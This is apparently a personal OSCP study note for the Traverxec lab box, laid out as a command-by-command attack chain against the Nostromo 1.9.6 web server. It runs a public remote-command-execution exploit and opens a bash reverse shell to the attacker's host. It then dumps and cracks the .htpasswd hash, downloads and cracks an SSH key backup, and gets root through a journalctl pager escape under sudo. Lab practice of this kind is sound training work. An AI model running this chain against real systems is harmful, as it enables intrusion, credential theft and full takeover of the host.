# Nostromo RCE

Exact command syntax for Nostromo 1.9.6 command execution and the credential path used after the foothold.

## Exploit review and proof

```bash
searchsploit nostromo 1.9.6
searchsploit -x 47837
searchsploit -m 47837
mkdir -p $BoxDir/exploits
cp 47837.py $BoxDir/exploits/nostromo-47837.py
sed -i 's/^cve2019_16278\.py$/# cve2019_16278.py/' $BoxDir/exploits/nostromo-47837.py
python2 -m py_compile $BoxDir/exploits/nostromo-47837.py
python2 $BoxDir/exploits/nostromo-47837.py $BoxIP $WebPort "id"
```

## Reverse shell

```bash
nc -lvnp $Lport
python2 $BoxDir/exploits/nostromo-47837.py $BoxIP $WebPort \
  "bash -c 'bash -i >& /dev/tcp/$LocalIP/$Lport 0>&1'"
```

## Nostromo configuration and protected archive

```bash
python2 $BoxDir/exploits/nostromo-47837.py $BoxIP $WebPort \
  "cat /var/nostromo/conf/nhttpd.conf"
python2 $BoxDir/exploits/nostromo-47837.py $BoxIP $WebPort \
  "cat /var/nostromo/conf/.htpasswd" > $BoxDir/loot/htpasswd-response.txt 2>&1
sed -n '/^david:/p' $BoxDir/loot/htpasswd-response.txt > $BoxDir/loot/htpasswd.hash
john --wordlist=/usr/share/wordlists/rockyou.txt $BoxDir/loot/htpasswd.hash
curl -fsS -u "$Username:$Password" \
  "http://$BoxIP/~$Username/protected-file-area/backup-ssh-identity-files.tgz" \
  -o $BoxDir/loot/backup-ssh-identity-files.tgz
tar -tzf $BoxDir/loot/backup-ssh-identity-files.tgz
tar -xzf $BoxDir/loot/backup-ssh-identity-files.tgz -C $BoxDir/loot/
```

## Encrypted SSH key

```bash
ssh2john $BoxDir/loot/home/$Username/.ssh/id_rsa > $BoxDir/loot/$Username-id-rsa.john
john --wordlist=/usr/share/wordlists/rockyou.txt $BoxDir/loot/$Username-id-rsa.john
chmod 600 $BoxDir/loot/home/$Username/.ssh/id_rsa
ssh -i $BoxDir/loot/home/$Username/.ssh/id_rsa \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  $Username@$BoxIP
```

## Argument-specific journalctl sudo escape

```bash
sed -n '1,240p' /home/$Username/bin/server-stats.sh
sudo -n /usr/bin/journalctl -n5 -unostromo.service
```

Inside the pager:

```text
!/bin/bash
```

## Seen in

- [[OSCP/BOXES/WRITE UPS/Linux/Traverxec|Traverxec]] -- complete Nostromo RCE, protected archive, encrypted key, and pager escape chain

## Full walkthrough

- [[OSCP/RUNBOOK V2/Linux - Nostromo RCE|Linux - Nostromo RCE]]
